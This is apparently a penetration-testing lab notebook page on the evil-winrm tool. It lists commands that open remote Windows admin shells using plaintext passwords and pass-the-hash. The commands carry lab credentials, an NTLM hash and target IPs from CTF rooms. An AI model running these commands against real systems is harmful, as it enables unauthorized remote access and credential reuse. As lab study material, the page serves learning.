# evil-winrm

## Wreath Commands

```bash
proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```
Used on: **Wreath** - stabilized a Windows admin shell and later reused the Administrator NTLM hash.

Ruby-based interactive shell over WinRM (port 5985/5986). Used to access Windows boxes once valid credentials are recovered and the user is a member of `Remote Management Users`.

## Commands Used

### Connect with plaintext credentials
```bash
evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
```
Used on: **Overwatch**

### Connect with Pass-the-Hash
```bash
evil-winrm -i $TARGET -u Administrator -H $(cat admin-hash.txt)
```
Used on: **AttacktiveDirectory**

- `-i` — target IP
- `-u` / `-p` — username / password

Once inside, standard PowerShell cmdlets are available (`type`, `Get-ChildItem`, `Invoke-RestMethod`, registry queries, etc.).


